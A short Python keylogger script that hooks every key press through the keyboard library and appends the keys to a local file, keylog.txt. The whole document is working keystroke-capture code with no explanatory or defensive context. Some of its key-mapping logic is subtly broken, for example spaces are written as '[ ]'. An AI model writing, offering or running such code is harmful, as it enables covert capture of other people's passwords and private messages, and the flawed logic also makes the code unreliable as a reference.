import keyboard

def on_press(event):
    key = event.name

    if len(key) > 1:
        if key == "space":
            key = " " 
        if key == "[ALT]":
            key = "" 
        if key == "[TAB]":
            key = ""      
        elif key == "enter":
            key = "\n"
        else:
            key = f"[{key.upper()}]"              
    with open("keylog.txt", "a") as f:
        f.write(key)

keyboard.on_press(on_press)
keyboard.wait()
